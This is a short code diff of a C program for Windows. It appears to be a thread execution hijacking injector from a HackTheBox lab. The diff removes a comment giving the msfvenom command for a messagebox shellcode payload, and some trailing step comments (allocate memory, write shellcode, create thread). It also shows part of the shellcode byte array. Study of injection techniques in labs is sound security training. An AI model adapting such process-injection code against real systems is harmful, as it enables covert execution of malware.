@@ -2,7 +2,6 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
-// msfvenom -p windows/x64/messagebox TEXT="Thread Execution Hijacking" TITLE="HackTheBox Lab" -f c -v shellcode
 unsigned char shellcode[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -144,7 +143,3 @@ int main(int argc, char *argv[])
     CloseHandle(targetProcess);
     return 0;
 }
-
-// AllocMemory
-// WriteShellcode
-// CreateThread
